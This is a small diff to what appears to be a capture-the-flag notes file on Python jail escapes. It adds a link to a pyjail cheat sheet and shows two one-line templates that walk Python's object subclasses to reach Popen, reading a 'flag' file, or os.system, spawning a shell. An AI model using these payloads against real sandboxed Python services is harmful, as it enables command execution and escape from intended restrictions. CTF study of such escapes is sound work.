@@ -3,7 +3,7 @@
 # Jail Escape
 
 ## Python
-
+- https://shirajuki.js.org/blog/pyjail-cheatsheet/
 - Quick templates:
   - ().__class__.__bases__[0].__subclasses__()[INDEX_OF_POPEN](["/bin/cat","flag"], stdout=-1).communicate()
   - ().__class__.__bases__[0].__subclasses__()[INDEX_OF_os._wrap_close].__init__.__globals__['sys'].modules['os'].system('sh')
